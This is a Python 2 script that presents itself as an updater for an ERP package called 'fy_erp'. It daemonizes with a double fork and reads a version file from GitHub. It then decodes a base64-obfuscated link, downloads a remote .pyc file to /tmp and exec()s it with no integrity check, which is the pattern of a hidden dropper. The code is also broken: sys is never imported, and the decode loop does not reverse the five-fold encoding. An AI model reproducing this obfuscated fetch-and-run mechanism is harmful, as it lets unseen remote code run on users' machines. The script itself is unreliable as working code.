#!/usr/bin/env python
# _*_ coding:utf8 _*_
# Kevien：vianus@qq.com  CreatDate:2017-1-10


def main():
    import os
    import re
    import urllib
    import urllib2
    import time
    import base64

    #定时同步更新
    flang = True
    while flang:    
        #获取网页
        def get_html(url):
            page = urllib2.urlopen(url)
            html = page.read()
            return(html)

        #获取网页或文件内相关信息
        def get_text(text):
            text = re.search('软件名称:.*?',html,re.S)
            text = text.group(0)
            text = re.findall('软件名称:(.*?)\n升级版本:(.*?)\n发布日期:(.*?)\n升级说明:(.*?)\n更新内容:(.*?)\n',text,re.S)
            return(text)
   
        #解密文本并下载运行主文件
        def base64_de(text):
            for i in range(0,5):
                insturl = base64.decodestring(text)
                print insturl
            #下载文件到/tmp
            urllib.urlretrieve(insturl,'/tmp/inst.pyc')
            exec(open('/tmp/inst.pyc').read())
           
            
        #获取文件文本
        def get_file(filename):
            with open(filename) as text:
                text = text.read()
                return(text)
  
    
        #取远程版本号
        html = get_html("https://raw.githubusercontent.com/alisuki/Update/fy_erp/Ver")
        text = get_text(html)
        remote_ver = text[0][2]
        print(remote_ver)
        

        #取本地版本号
        if os.path.isdir('/etc/fyerp'):
            if os.path.isfile('/etc/fyerp/Ver'):
                text = get_file('/etc/fyerp/Ver')
                text = get_text(text)
                local_ver = text[0][2]
                print(local_ver)
            else:
                base64_de(text[0][4])
        else:
            os.mkdir('/etc/fyerp')
            base64_de(text[0][4])
            

        #进行版本对比
        if remote_ver > local_ver:
            base64_de(text[0][4])
        flang = False
        time.sleep(1500)



if __name__ == "__main__":
    # do the UNIX double-fork magic, see Stevens' "Advanced 
    # Programming in the UNIX Environment" for details (ISBN 0201563177)
    try: 
        pid = os.fork() 
        if pid > 0:
            # exit first parent
            sys.exit(0) 
    except OSError, e: 
        print >>sys.stderr, "fork #1 failed: %d (%s)" % (e.errno, e.strerror) 
        sys.exit(1)

    # decouple from parent environment
    os.chdir("/") 
    os.setsid() 
    os.umask(0) 

    # do second fork
    try: 
        pid = os.fork() 
        if pid > 0:
            # exit from second parent, print eventual PID before
            print "Daemon PID %d" % pid 
            sys.exit(0) 
    except OSError, e: 
        print >>sys.stderr, "fork #2 failed: %d (%s)" % (e.errno, e.strerror) 
        sys.exit(1) 

    # start the daemon main loop
    main() 
       
       
       
        
'''        
s =  'active:20170512|download:https://github.com/alisuki/Update/raw/fy_erp/v4.0/inst.pyc'
for i in range(0,5):
    s=base64.encodestring(s)
    print s
'''
        
